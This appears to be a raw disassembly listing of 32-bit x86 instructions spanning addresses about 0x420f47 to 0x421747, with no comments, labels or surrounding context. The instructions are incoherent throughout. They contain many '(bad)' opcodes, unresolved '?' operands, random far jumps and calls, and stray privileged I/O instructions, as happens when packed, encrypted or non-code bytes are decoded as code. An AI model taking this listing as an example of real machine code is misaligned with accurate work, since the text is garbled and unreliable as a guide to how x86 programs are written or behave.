  420f47:	not    BYTE PTR [ebp+eax*8+0x1f]
  420f4b:	jmp    0x97d30b3
  420f50:	popf   
  420f51:	je     0x420f4c
  420f53:	int    0xe8
  420f55:	inc    ebx
  420f56:	xchg   edx,eax
  420f57:	fs xor eax,0x9f5fa131
  420f5d:	push   ebx
  420f5e:	popf   
  420f5f:	mov    bh,0xc9
  420f61:	adc    bl,BYTE PTR [edx-0x75]
  420f64:	loop   0x420f7c
  420f66:	or     al,0x10
  420f68:	fst    DWORD PTR [ebp-0x4b]
  420f6b:	shl    DWORD PTR [esi],0xf6
  420f6e:	and    BYTE PTR [edi*4+0x3883d1fd],bl
  420f75:	call   0xef90:0xca634a36
  420f7c:	jbe    0x420fec
  420f7e:	mov    edi,ebx
  420f80:	idiv   DWORD PTR [edx-0x4b]
  420f83:	or     eax,0xbccb6f9f
  420f88:	(bad)  
  420f89:	es push esi
  420f8b:	sar    edx,cl
  420f8d:	daa    
  420f8e:	and    eax,0x8bd0a284
  420f93:	inc    ebx
  420f94:	fs scas al,BYTE PTR es:[edi]
  420f96:	arpl   WORD PTR [ebx+0x69d73c05],bx
  420f9c:	mov    ecx,0xafda9568
  420fa1:	stos   DWORD PTR es:[edi],eax
  420fa2:	in     eax,0x42
  420fa4:	cmp    edx,DWORD PTR ds:0x8bbb369b
  420faa:	mul    DWORD PTR [edx+eax*2]
  420fad:	cmp    eax,0xfa7e73c6
  420fb2:	xchg   BYTE PTR [ebp+0x291e796],dl
  420fb8:	inc    esp
  420fb9:	or     eax,0x3d49309b
  420fbe:	jecxz  0x421003
  420fc0:	ja     0x420fc3
  420fc2:	xchg   esp,eax
  420fc3:	pop    ss
  420fc4:	loop   0x420f9e
  420fc6:	mov    bl,BYTE PTR [ebp-0xee151bc]
  420fcc:	mov    ecx,0xfabc39a9
  420fd1:	push   edx
  420fd2:	jmp    0x89ca:0x2b0acee3
  420fd9:	repz inc edi
  420fdb:	jmp    FWORD PTR [ecx]
  420fdd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420fde:	jl     0x421003
  420fe0:	dec    edi
  420fe1:	pop    es
  420fe2:	jecxz  0x420fc0
  420fe4:	aam    0xd7
  420fe6:	pop    ds
  420fe7:	gs inc esi
  420fe9:	loopne 0x420fe9
  420feb:	mov    bl,0xa0
  420fed:	fnstenv [edx-0x51]
  420ff0:	mov    edi,0x7956d75b
  420ff5:	mov    ?,esp
  420ff7:	ror    al,cl
  420ff9:	push   esp
  420ffa:	push   eax
  420ffb:	push   0xae0f0696
  421000:	xlat   BYTE PTR ds:[ebx]
  421001:	shr    bl,1
  421003:	retf   
  421004:	leave  
  421005:	inc    edx
  421006:	mov    ebp,0x85435265
  42100b:	dec    ecx
  42100c:	or     DWORD PTR [esi+0x1e],ebp
  42100f:	mov    dh,0x1c
  421011:	cwde   
  421012:	adc    cl,ch
  421014:	inc    edi
  421015:	dec    edi
  421016:	add    cl,BYTE PTR [eax-0x2cc3905c]
  42101c:	sub    eax,DWORD PTR cs:[edi+ecx*8-0x2d]
  421021:	sbb    eax,0xfc8013b1
  421026:	mov    esp,0x642456e0
  42102b:	gs sub eax,0x900ef14b
  421031:	dec    esi
  421032:	iret   
  421033:	in     al,dx
  421034:	mov    dl,0x2
  421036:	daa    
  421037:	cmp    BYTE PTR [ebx-0x38],dl
  42103a:	add    DWORD PTR [ebx+0x3bb644b3],edx
  421040:	fcomp  DWORD PTR [edx-0x42499245]
  421046:	jae    0x420fee
  421048:	mov    bh,0x2c
  42104a:	popf   
  42104b:	clc    
  42104c:	inc    edx
  42104d:	loope  0x421045
  42104f:	ret    
  421050:	mov    ah,0x1a
  421052:	popa   
  421053:	int3   
  421054:	aad    0xde
  421056:	sub    BYTE PTR [ebx-0x44095731],cl
  42105c:	inc    ebp
  42105d:	fild   QWORD PTR ds:0x4d719947
  421063:	popf   
  421064:	jmp    DWORD PTR [ecx+ebp*4+0x5a796358]
  42106b:	xor    DWORD PTR [edx],edx
  42106d:	out    dx,eax
  42106e:	mov    edx,0xf9207260
  421073:	aad    0x5a
  421075:	mov    al,0x51
  421077:	push   esi
  421078:	inc    ah
  42107a:	or     eax,0x538d1722
  42107f:	jbe    0x42102d
  421081:	mov    eax,0xa9b80592
  421086:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421087:	andps  xmm4,XMMWORD PTR [ecx-0x43dbc762]
  42108e:	mov    WORD PTR [eax-0x4c],gs
  421091:	div    DWORD PTR [esi+0x8315578]
  421097:	xor    eax,0x48b82462
  42109c:	push   esi
  42109d:	cmp    ebx,DWORD PTR [edx-0x4]
  4210a0:	or     edi,ebx
  4210a2:	dec    ecx
  4210a3:	aaa    
  4210a4:	mov    ecx,0x45e29d67
  4210a9:	test   al,0xbb
  4210ab:	mov    ah,0xa
  4210ad:	jno    0x4210f2
  4210af:	jle    0x4210bf
  4210b1:	jb     0x421079
  4210b3:	inc    eax
  4210b4:	fsubr  QWORD PTR [ebx]
  4210b6:	jmp    0xa019bf0f
  4210bb:	int    0xc9
  4210bd:	pusha  
  4210be:	pop    es
  4210bf:	loopne 0x4210e1
  4210c1:	test   BYTE PTR [edi+0x68],ch
  4210c4:	mov    al,ds:0x0
	...
  4210d1:	dec    edx
  4210d2:	jo     0x4210ac
  4210d4:	jl     0x4210d0
  4210d6:	cld    
  4210d7:	out    dx,al
  4210d8:	jbe    0x4210cf
  4210da:	outs   dx,DWORD PTR ds:[esi]
  4210db:	cmp    al,0xe0
  4210dd:	sbb    ah,BYTE PTR [edx-0x7572fddb]
  4210e3:	add    DWORD PTR [eax],eax
  4210e5:	lods   al,BYTE PTR ds:[esi]
  4210e6:	add    eax,DWORD PTR [eax]
  4210e8:	add    BYTE PTR [ebx],al
  4210ea:	mov    al,0xfc
  4210ec:	(bad)  
  4210ed:	es mov esp,cs
  4210f0:	test   edx,esi
  4210f2:	mov    al,0x5f
  4210f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4210f5:	sbb    dl,BYTE PTR [esi-0x6]
  4210f8:	jbe    0x4210c9
  4210fa:	xchg   edi,eax
  4210fb:	ss inc ecx
  4210fd:	pop    esp
  4210fe:	xor    DWORD PTR [edx],ebp
  421100:	jl     0x4210f7
  421102:	mov    cl,0xa4
  421104:	ins    DWORD PTR es:[edi],dx
  421105:	dec    eax
  421106:	and    eax,0x8f6ca080
  42110b:	sbb    al,0xf7
  42110d:	lods   eax,DWORD PTR ds:[esi]
  42110e:	mov    edx,0x3d91292c
  421113:	jne    0x42109b
  421115:	es int 0xef
  421118:	cmp    ecx,DWORD PTR [ebp+0x77]
  42111b:	sti    
  42111c:	inc    edx
  42111d:	lods   al,BYTE PTR ds:[esi]
  42111e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42111f:	cmp    edx,DWORD PTR [edx+edi*1+0x5c0949b6]
  421126:	mov    ds:0x2b024e3a,al
  42112b:	stos   BYTE PTR es:[edi],al
  42112c:	leave  
  42112d:	add    BYTE PTR [edi+0x38cba8d8],al
  421133:	dec    ebp
  421134:	in     eax,dx
  421135:	jmp    0x421164
  421137:	mov    ds:0x30ebbbe,al
  42113c:	and    bl,dl
  42113e:	mov    ds:0x332ac2ee,al
  421143:	ds aas 
  421145:	arpl   WORD PTR [ebp+0x7e],di
  421148:	ins    BYTE PTR es:[edi],dx
  421149:	stos   DWORD PTR es:[edi],eax
  42114a:	out    0xed,eax
  42114c:	xchg   esi,eax
  42114d:	jl     0x421119
  42114f:	and    esp,esi
  421151:	fdivrp st(6),st
  421153:	jbe    0x42114f
  421155:	and    DWORD PTR [edx],ebp
  421157:	and    esp,DWORD PTR [ebx+0x724f0c71]
  42115d:	aad    0x6e
  42115f:	(bad)  
  421160:	out    dx,eax
  421161:	or     DWORD PTR [edx+ebx*1],ebp
  421164:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421165:	jmp    0x4211dd
  421167:	inc    esi
  421168:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421169:	idiv   ebp
  42116b:	lahf   
  42116c:	loop   0x4211aa
  42116e:	repz pop edi
  421170:	std    
  421171:	ins    DWORD PTR es:[edi],dx
  421172:	mov    dl,0xc5
  421174:	arpl   WORD PTR [esi-0x2cb8e241],sp
  42117a:	inc    di
  42117c:	jno    0x4211c7
  42117e:	sub    esp,DWORD PTR [edi-0x1f5d34f6]
  421184:	clc    
  421185:	mov    al,0x9b
  421187:	add    DWORD PTR [eax+0x1a],esi
  42118a:	repz push 0xe49f3195
  421190:	dec    edx
  421191:	ret    0xa0a2
  421194:	xlat   BYTE PTR ds:[ebx]
  421195:	fcmovne st,st(2)
  421197:	mov    eax,ds:0xa40d2a19
  42119c:	xlat   BYTE PTR ds:[ebx]
  42119d:	clc    
  42119e:	cmp    BYTE PTR gs:[esp-0x6f53d11c],cl
  4211a6:	and    BYTE PTR [ebx-0x1fe47730],ah
  4211ac:	in     eax,dx
  4211ad:	xchg   esi,eax
  4211ae:	icebp  
  4211af:	leave  
  4211b0:	xor    ebx,DWORD PTR [ecx]
  4211b2:	hlt    
  4211b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4211b4:	scas   eax,DWORD PTR es:[edi]
  4211b5:	sbb    dl,BYTE PTR [ecx+0x6b]
  4211b8:	adc    al,0x68
  4211ba:	call   0x6831f1f
  4211bf:	(bad)  
  4211c0:	imul   ebx,DWORD PTR [esp+edi*2+0x7834e935],0x1b78e56d
  4211cb:	jl     0x421155
  4211cd:	stos   BYTE PTR es:[edi],al
  4211ce:	add    ebx,DWORD PTR [esp+eax*8]
  4211d1:	and    eax,0xe9a45c48
  4211d6:	js     0x42121b
  4211d8:	(bad)  
  4211da:	fsub   DWORD PTR [eax-0x5d]
  4211dd:	fdiv   QWORD PTR [ebx-0x1e]
  4211e0:	pop    ss
  4211e1:	aam    0x33
  4211e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4211e4:	xor    al,0xf
  4211e6:	sub    eax,0x6a568cc
  4211eb:	mul    BYTE PTR [ecx]
  4211ed:	push   0xffb90052
  4211f2:	cmp    al,0xc7
  4211f4:	(bad)  
  4211f5:	out    0x95,al
  4211f7:	cmc    
  4211f8:	jmp    0xc162:0x7f0b38a8
  4211ff:	mov    BYTE PTR ds:0x2d89083f,ah
  421205:	(bad)  
  421206:	mov    eax,DWORD PTR [ecx-0x2df999e1]
  42120c:	mov    edi,0xa5783e5e
  421211:	(bad)  
  421212:	(bad)  
  421214:	pop    esp
  421215:	int    0xfe
  421217:	jge    0x4211b8
  421219:	inc    ebp
  42121a:	cli    
  42121b:	test   al,0x57
  42121d:	jl     0x4211e5
  42121f:	dec    edx
  421220:	jne    0x421257
  421222:	cmc    
  421223:	(bad)  
  421224:	pop    edi
  421225:	mov    ecx,0x15c4c37c
  42122a:	adc    cl,dl
  42122c:	xchg   DWORD PTR [edi+0x4e0239c9],edi
  421232:	int3   
  421233:	sbb    DWORD PTR [esi+0x6ba26508],esp
  421239:	xor    DWORD PTR [ebp-0x401b4b9b],ebx
  42123f:	imul   esi,DWORD PTR [edi-0x7eb8efcc],0x9c9097c4
  421249:	cmp    eax,DWORD PTR [ebx-0x1590deb2]
  42124f:	repz mov es,WORD PTR [edx-0x4d]
  421253:	loop   0x421204
  421255:	or     DWORD PTR [edx+0x59fd49db],ebp
  42125b:	mov    ch,0x4f
  42125d:	and    DWORD PTR [ecx-0x65],edi
  421260:	(bad)  
  421261:	fwait
  421262:	cwde   
  421263:	sbb    DWORD PTR [edi],0x1f
  421266:	stos   BYTE PTR es:[edi],al
  421267:	mov    ebp,0xbaecf7ba
  42126c:	stos   DWORD PTR es:[edi],eax
  42126d:	scas   al,BYTE PTR es:[edi]
  42126e:	xlat   BYTE PTR ds:[ebx]
  42126f:	or     DWORD PTR [ecx+edx*2],edi
  421272:	or     DWORD PTR [edx-0x30],esp
  421275:	sub    al,0x65
  421277:	cmp    ebx,DWORD PTR [ecx+edx*1-0x2d1a311a]
  42127e:	jp     0x421218
  421280:	push   es
  421281:	imul   eax,DWORD PTR [eax],0x9
  421284:	jecxz  0x421276
  421286:	sti    
  421287:	int    0x2a
  421289:	aam    0x73
  42128b:	or     BYTE PTR [edi-0x2e9bac30],bl
  421291:	popa   
  421292:	test   eax,0x75ed5884
  421297:	mov    edx,0xf8e01c7f
  42129c:	cmp    DWORD PTR [edi+ecx*4-0x38a99878],esi
  4212a3:	mov    bh,0x6c
  4212a5:	xchg   ebx,eax
  4212a6:	mov    dh,BYTE PTR [ebx]
  4212a8:	xor    esi,DWORD PTR [ebp+0x7]
  4212ab:	add    eax,0x5e281409
  4212b0:	dec    ebx
  4212b1:	mov    ch,0xd5
  4212b3:	mov    edx,0x73276fa1
  4212b8:	(bad)  
  4212b9:	jg     0x4212e5
  4212bb:	xchg   esp,eax
  4212bc:	popf   
  4212bd:	test   cl,ch
  4212bf:	(bad)  
  4212c0:	xor    DWORD PTR [eax+0x51],edx
  4212c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4212c4:	in     al,0xe0
  4212c6:	xchg   ecx,eax
  4212c7:	inc    ebp
  4212c8:	mov    eax,ds:0x7d09575
  4212cd:	call   0x19196710
  4212d2:	push   ebx
  4212d3:	scas   al,BYTE PTR es:[edi]
  4212d4:	xchg   DWORD PTR [esi],ebx
  4212d6:	in     al,0x23
  4212d8:	or     al,0x81
  4212da:	push   ecx
  4212db:	out    0x67,al
  4212dd:	(bad)  
  4212de:	(bad)  
  4212df:	jmp    0x421308
  4212e1:	test   bl,0x7b
  4212e4:	cmc    
  4212e5:	inc    esp
  4212e6:	mov    eax,ds:0x4c140ea
  4212eb:	popa   
  4212ec:	or     DWORD PTR [ebx+0x5f],edx
  4212ef:	clc    
  4212f0:	test   eax,0x275653c8
  4212f5:	fcom   QWORD PTR [edi+0x4793043c]
  4212fb:	clc    
  4212fc:	mov    ch,0x1
  4212fe:	iret   
  4212ff:	sbb    DWORD PTR [esi],0xffffffa8
  421302:	lods   al,BYTE PTR ds:[esi]
  421303:	xor    BYTE PTR ds:0xa6b3f7f5,bl
  421309:	das    
  42130a:	inc    ebx
  42130b:	jmp    0x421305
  42130d:	mov    cs,edx
  42130f:	cli    
  421310:	jle    0x421386
  421312:	idiv   edi
  421314:	call   0x5ce5:0x5e8fd9e3
  42131b:	pop    edi
  42131c:	pop    ecx
  42131d:	xor    ah,dl
  42131f:	(bad)
  421322:	test   al,0xcc
  421324:	cli    
  421325:	shl    BYTE PTR [eax+0x59],1
  421328:	dec    ecx
  421329:	nop
  42132a:	or     BYTE PTR [edx-0x365e4128],bh
  421330:	in     eax,0x7e
  421332:	rcr    DWORD PTR [edx-0x2b3cac24],0x25
  421339:	repz shr BYTE PTR [ecx-0x20f1be1b],0xd7
  421341:	add    BYTE PTR [esi],ah
  421343:	mov    ds:0x1e922138,al
  421348:	fwait
  421349:	cwde   
  42134a:	aas    
  42134b:	pop    ss
  42134c:	call   0x33d61a3e
  421351:	sbb    DWORD PTR [eax-0x59],ecx
  421354:	aad    0xef
  421356:	sub    ebp,esi
  421358:	fld    DWORD PTR [esp+ebx*2+0x49fc67f8]
  42135f:	inc    esi
  421360:	cmp    ah,BYTE PTR [ebp+0x71984bea]
  421366:	mov    ebx,0x6f11606f
  42136b:	scas   al,BYTE PTR es:[edi]
  42136c:	out    dx,eax
  42136d:	sbb    al,0xd3
  42136f:	sbb    al,0x41
  421371:	xchg   ebx,eax
  421372:	iret   
  421373:	jbe    0x42139b
  421375:	into   
  421376:	mov    bl,0xcf
  421378:	shl    DWORD PTR [eax+0x21f114b5],1
  42137e:	dec    esp
  42137f:	neg    BYTE PTR [edx]
  421381:	sub    al,0xe9
  421383:	pop    es
  421384:	lock sbb eax,edx
  421387:	inc    ebp
  421388:	pop    esp
  421389:	xor    eax,0xc2bc2522
  42138e:	das    
  42138f:	js     0x4213eb
  421391:	add    BYTE PTR [edx+0x59],dh
  421394:	lahf   
  421395:	mov    dh,cl
  421397:	lahf   
  421398:	pop    esp
  421399:	aaa    
  42139a:	leave  
  42139b:	(bad)  
  42139c:	bound  edx,QWORD PTR [esi+ebx*1]
  42139f:	cmp    al,0xed
  4213a1:	mov    WORD PTR [ebp-0x2a],?
  4213a4:	jb     0x4213a5
  4213a6:	mov    bh,0x22
  4213a8:	mov    esi,0xf4206dbf
  4213ad:	ror    BYTE PTR [edi],1
  4213af:	dec    ebp
  4213b0:	add    cl,BYTE PTR [edi-0x1f009318]
  4213b6:	in     eax,0xbd
  4213b8:	mov    edx,0x3b610a67
  4213bd:	mov    ebp,0xaf5f6aae
  4213c2:	idiv   BYTE PTR [edi]
  4213c4:	push   es
  4213c5:	add    BYTE PTR [ebp+ebp*2+0x59],bl
  4213c9:	or     esp,DWORD PTR [ebx-0x34]
  4213cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4213cd:	test   al,0xde
  4213cf:	mov    ?,edi
  4213d1:	mov    edx,0x21a960a
  4213d6:	pop    ebx
  4213d7:	mov    al,0xad
  4213d9:	xlat   BYTE PTR ds:[ebx]
  4213da:	bound  ebp,QWORD PTR [edi]
  4213dc:	jge    0x4213a4
  4213de:	pop    es
  4213df:	push   ds
  4213e0:	dec    ebx
  4213e1:	stos   DWORD PTR es:[edi],eax
  4213e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4213e3:	sbb    eax,0x61b19d2a
  4213e8:	ror    edi,1
  4213ea:	dec    ebx
  4213eb:	xor    eax,DWORD PTR [ecx]
  4213ed:	push   0x852c145d
  4213f2:	mov    esi,0x6c862187
  4213f7:	mov    eax,ds:0xf77cc67f
  4213fc:	and    al,0xe4
  4213fe:	or     DWORD PTR [eax-0x2c],edx
  421401:	push   es
  421402:	mov    al,0x7a
  421404:	(bad)  
  421405:	repz js 0x421401
  421408:	into   
  421409:	dec    esp
  42140a:	sbb    eax,0x4a863644
  42140f:	push   0x1e
  421411:	and    eax,0x80b68bd0
  421416:	add    eax,eax
  421418:	fs sub al,0x57
  42141b:	clc    
  42141c:	sbb    ebp,DWORD PTR [edx]
  42141e:	dec    edi
  42141f:	div    DWORD PTR [edx-0x1b316ba7]
  421425:	sub    DWORD PTR [ebx],ecx
  421427:	xor    BYTE PTR [eax+0x59],bl
  42142a:	mov    al,0xd
  42142c:	cli    
  42142d:	lods   al,BYTE PTR ds:[esi]
  42142e:	mov    ch,0x7a
  421430:	dec    ebp
  421431:	repz daa 
  421433:	hlt    
  421434:	aam    0x87
  421436:	jne    0x4214b1
  421438:	push   ecx
  421439:	xchg   esp,eax
  42143a:	push   ebp
  42143b:	or     al,0xdc
  42143d:	ja     0x4213ec
  42143f:	lahf   
  421440:	pop    ebp
  421441:	sub    eax,0xb8c11bf2
  421446:	push   edi
  421447:	adc    dl,BYTE PTR [esi+0x5f]
  42144a:	adc    DWORD PTR [edx+0x5325fb63],0x54
  421451:	loop   0x421433
  421453:	cld    
  421454:	(bad)  
  421455:	xchg   ecx,eax
  421456:	xor    DWORD PTR [ecx+edi*8],esp
  421459:	mov    bh,BYTE PTR [eax]
  42145b:	push   0x20954861
  421460:	imul   edx,DWORD PTR [ebx+0x6e],0xbab79eb5
  421467:	out    dx,al
  421468:	push   es
  421469:	test   eax,0x3b3815ca
  42146e:	xchg   esi,eax
  42146f:	or     DWORD PTR [eax],edx
  421471:	push   ecx
  421472:	repnz pushf 
  421474:	mov    BYTE PTR [edi+0x1e],dh
  421477:	dec    esi
  421478:	sbb    BYTE PTR [ecx],0x1b
  42147b:	adc    al,0x58
  42147d:	inc    esp
  42147e:	push   0x46
  421480:	in     al,dx
  421481:	cmp    eax,0x10990733
  421486:	pop    ss
  421487:	jmp    0xa69c:0xff934c4b
  42148e:	les    ecx,FWORD PTR [eax-0x47e00a5b]
  421494:	sub    al,0x0
	...
  42149e:	add    BYTE PTR [eax],al
  4214a0:	add    BYTE PTR [ebp-0x2c737c23],cl
  4214a6:	fimul  WORD PTR [edi-0x66af6223]
  4214ac:	daa    
  4214ad:	cdq    
  4214ae:	sub    DWORD PTR [eax],ebx
  4214b0:	inc    edx
  4214b1:	cmp    DWORD PTR [esi+0x3ac0001],ecx
  4214b7:	add    BYTE PTR [eax],al
  4214b9:	sbb    DWORD PTR [edx-0x55],eax
  4214bc:	push   0x68
  4214be:	jne    0x42150b
  4214c0:	xchg   ecx,eax
  4214c1:	xchg   BYTE PTR [edi+0x2d],ch
  4214c4:	push   esp
  4214c5:	pop    esp
  4214c6:	jmp    0x5fe72333
  4214cb:	sbb    eax,0xc810f243
  4214d0:	adc    eax,0xfa7136a8
  4214d5:	mov    ebp,0x5a1874d2
  4214da:	jns    0x4214fd
  4214dc:	jb     0x421512
  4214de:	call   0x7655:0x3cd61456
  4214e5:	pusha  
  4214e6:	pushf  
  4214e7:	mov    dl,0x5d
  4214e9:	int3   
  4214ea:	lods   eax,DWORD PTR ds:[esi]
  4214eb:	stos   BYTE PTR es:[edi],al
  4214ec:	pushf  
  4214ed:	icebp  
  4214ee:	inc    ebp
  4214ef:	mov    eax,0x4e42843f
  4214f4:	xor    BYTE PTR [ecx],dl
  4214f6:	sbb    al,0xc
  4214f8:	xchg   ebp,eax
  4214f9:	push   ecx
  4214fa:	mov    ds:0x99c8d3b,eax
  4214ff:	adc    dl,BYTE PTR [ecx+0x7853c99]
  421505:	inc    eax
  421506:	dec    esp
  421507:	mov    al,ds:0x1684c8d0
  42150c:	loop   0x421509
  42150e:	neg    DWORD PTR [ecx+esi*2-0x291cf109]
  421515:	retf   
  421516:	dec    ebx
  421517:	imul   esi,DWORD PTR [edx+0x475cc1c9],0xffffffbe
  42151e:	stos   DWORD PTR es:[edi],eax
  42151f:	pushf  
  421520:	xchg   esp,eax
  421521:	retf   
  421522:	imul   eax,ecx,0xfffffffb
  421525:	xchg   esi,eax
  421526:	les    eax,FWORD PTR [ebp+eax*1-0x77d1826b]
  42152d:	repnz inc ebp
  42152f:	fwait
  421530:	xlat   BYTE PTR ds:[ebx]
  421531:	push   ecx
  421532:	push   ecx
  421533:	xchg   ecx,eax
  421534:	and    DWORD PTR [esp+esi*4+0x369b83a8],ebp
  42153b:	adc    esp,DWORD PTR es:[edx]
  42153e:	mov    bl,0x41
  421540:	leave  
  421541:	add    bl,dl
  421543:	mov    ?,WORD PTR [edx+edi*8]
  421546:	retf   
  421547:	lock sahf 
  421549:	jg     0x421509
  42154b:	jo     0x421531
  42154d:	and    BYTE PTR [eax+ebp*1+0x75],al
  421551:	int3   
  421552:	ret    
  421553:	mov    ah,BYTE PTR [eax]
  421555:	rol    BYTE PTR [eax-0xd],cl
  421558:	mov    WORD PTR [ebp+0x4a9ab527],cs
  42155e:	stos   DWORD PTR es:[edi],eax
  42155f:	pop    edi
  421560:	push   ds
  421561:	push   esp
  421562:	mov    ds:0x11420299,eax
  421567:	mov    ds:0x79d1dad,al
  42156c:	sbb    al,0xdf
  42156e:	adc    eax,0xf8c95a73
  421573:	js     0x421581
  421575:	data16 arpl WORD PTR es:[eax-0x33040af5],si
  42157d:	fistp  DWORD PTR [edi-0x37]
  421580:	in     al,dx
  421581:	adc    ah,BYTE PTR [ebx+edx*8-0x2c79b9ad]
  421588:	xchg   ebp,eax
  421589:	jns    0x421576
  42158b:	jmp    0x90866e5
  421590:	lds    ebx,FWORD PTR [ebp-0x2b]
  421593:	xlat   BYTE PTR ds:[ebx]
  421594:	iret   
  421595:	dec    ebx
  421596:	pop    eax
  421597:	sti    
  421598:	xchg   edi,eax
  421599:	out    dx,al
  42159a:	lods   al,BYTE PTR ds:[esi]
  42159b:	jae    0x42158c
  42159d:	sub    ebx,DWORD PTR [esp+ebx*2-0x32]
  4215a1:	jnp    0x421546
  4215a3:	cmp    edi,DWORD PTR [eax+0x2a]
  4215a6:	push   ebp
  4215a7:	(bad)
  4215aa:	dec    ebp
  4215ab:	lock xor BYTE PTR [edx-0x1faed62c],0x50
  4215b3:	pop    edx
  4215b4:	mov    eax,0x79d5789
  4215b9:	sub    esp,DWORD PTR ds:[esi+0x7d]
  4215bd:	mov    ch,0x13
  4215bf:	dec    esp
  4215c0:	das    
  4215c1:	and    al,0xcc
  4215c3:	popa   
  4215c4:	jmp    0xbc67:0xde13b229
  4215cb:	fnstenv [eax+0x46]
  4215ce:	jg     0x4215e5
  4215d0:	mul    BYTE PTR [edi+0x760dd1a8]
  4215d6:	sar    DWORD PTR [esp+eax*8+0x4b],cl
  4215da:	sahf   
  4215db:	es je  0x4215ac
  4215de:	sub    DWORD PTR [eax-0x5ee605f9],esp
  4215e4:	push   eax
  4215e5:	fidivr WORD PTR [edx+0x35]
  4215e8:	gs leave 
  4215ea:	std    
  4215eb:	loop   0x4215fe
  4215ed:	sbb    BYTE PTR [edx+ecx*1-0xf],0x55
  4215f2:	jbe    0x4215cc
  4215f4:	not    DWORD PTR ds:0xbb734bcd
  4215fa:	in     eax,0x1e
  4215fc:	sbb    DWORD PTR [ebx],edi
  4215fe:	mov    BYTE PTR [ebp+0x6aa478cc],dh
  421604:	cmp    cl,0x10
  421607:	ret    
  421608:	push   0x966e0e02
  42160d:	mov    edx,0x78c5c23b
  421612:	jecxz  0x4215da
  421614:	inc    edx
  421615:	ins    DWORD PTR es:[edi],dx
  421616:	sti    
  421617:	ficom  DWORD PTR ds:0x6b4103f
  42161d:	pop    ecx
  42161e:	pop    eax
  42161f:	loop   0x421615
  421621:	(bad)  [ebp-0x56]
  421624:	fwait
  421625:	jnp    0x421652
  421627:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421628:	jbe    0x4215b6
  42162a:	and    cl,bl
  42162c:	pop    ss
  42162d:	and    ecx,edx
  42162f:	push   eax
  421630:	sbb    DWORD PTR fs:[eax+0x610bcf07],esi
  421637:	or     al,0x5f
  421639:	xlat   BYTE PTR ds:[ebx]
  42163a:	xor    BYTE PTR [edi+0x1425de3a],0xe8
  421641:	pop    esp
  421642:	stos   BYTE PTR es:[edi],al
  421643:	ins    DWORD PTR es:[edi],dx
  421644:	int3   
  421645:	push   esi
  421646:	js     0x42165c
  421648:	fidiv  WORD PTR [ecx-0x1b68fb13]
  42164e:	and    dl,BYTE PTR [edx+0x54]
  421651:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421652:	mov    ebx,0xb2d213c3
  421657:	pop    esp
  421658:	xchg   edx,eax
  421659:	add    edx,ebp
  42165b:	and    eax,0x478f849e
  421660:	or     dl,BYTE PTR [edi]
  421662:	lock jb 0x421650
  421665:	mov    ecx,0x85703702
  42166a:	sub    al,0xab
  42166c:	mov    ebp,0x74cc515b
  421671:	inc    edi
  421672:	jns    0x421603
  421674:	js     0x42164d
  421676:	mov    ebx,0x1599c49f
  42167b:	mov    edx,0xbbb6aeed
  421680:	iret   
  421681:	call   0x36bc:0xb129728c
  421688:	or     bh,cl
  42168a:	cmp    al,BYTE PTR [ecx+0x7a]
  42168d:	test   DWORD PTR [ebp-0x67],edi
  421690:	mov    al,ds:0xa846e0b0
  421695:	sar    edx,cl
  421697:	fscale 
  421699:	aaa    
  42169a:	mov    cl,0x18
  42169c:	pop    ss
  42169d:	popa   
  42169e:	loopne 0x42170d
  4216a0:	(bad)  
  4216a1:	cs iret 
  4216a3:	out    0x98,al
  4216a5:	dec    ebp
  4216a6:	div    BYTE PTR [esp+edx*4-0x45]
  4216aa:	jbe    0x4216f6
  4216ac:	or     DWORD PTR [edi-0xf6859d6],ebp
  4216b2:	cld    
  4216b3:	or     al,cl
  4216b5:	adc    ah,BYTE PTR [ebp+esi*1+0x5208f3f9]
  4216bc:	mov    bh,0xa7
  4216be:	pop    esi
  4216bf:	mov    bh,BYTE PTR [ebx-0x6b]
  4216c2:	neg    BYTE PTR [ebx]
  4216c4:	dec    edx
  4216c5:	pushf  
  4216c6:	rcl    DWORD PTR [edx+0x4d],0x9
  4216ca:	fcomp  DWORD PTR [esi-0xe697bfd]
  4216d0:	popf   
  4216d1:	mov    dh,0xc5
  4216d3:	mov    eax,0xd358fbc3
  4216d8:	mov    WORD PTR [edx],ds
  4216da:	stos   DWORD PTR es:[edi],eax
  4216db:	and    edi,edx
  4216dd:	pop    esi
  4216de:	int    0x1f
  4216e0:	in     eax,dx
  4216e1:	inc    edx
  4216e2:	pop    DWORD PTR [ebp+0x64]
  4216e5:	add    esp,DWORD PTR ds:0x7649078
  4216eb:	call   0x9730:0x261f9153
  4216f2:	ss cs xor al,0x48
  4216f7:	int3   
  4216f8:	arpl   sp,dx
  4216fa:	add    ecx,DWORD PTR ds:0x928101b
  421700:	mov    bl,0x20
  421702:	jl     0x421754
  421704:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421705:	or     al,0xc6
  421707:	pop    esi
  421708:	fcom   QWORD PTR [esi]
  42170a:	jmp    0xc13a251a
  42170f:	push   edi
  421710:	pop    edi
  421711:	(bad)  
  421712:	fwait
  421713:	push   esi
  421714:	daa    
  421715:	mov    al,ds:0x31ad7bc1
  42171a:	loopne 0x421740
  42171c:	mov    edx,DWORD PTR [esi]
  42171e:	pop    eax
  42171f:	in     al,dx
  421720:	popa   
  421721:	test   DWORD PTR [ebx-0x68],esi
  421724:	adc    al,0xe8
  421726:	aam    0xc
  421728:	jnp    0x4216f2
  42172a:	ret    0xd26e
  42172d:	fmul   st,st(0)
  42172f:	inc    eax
  421730:	mov    eax,ds:0x3871d576
  421735:	xor    al,0x6b
  421737:	fwait
  421738:	pusha  
  421739:	pop    edx
  42173a:	mov    dh,0x87
  42173c:	mov    ds:0xdade9ae8,eax
  421741:	ds (bad) 
  421743:	inc    edx
  421744:	cdq    
  421745:	xor    eax,DWORD PTR [ebx]
  421747:	js     0x421734
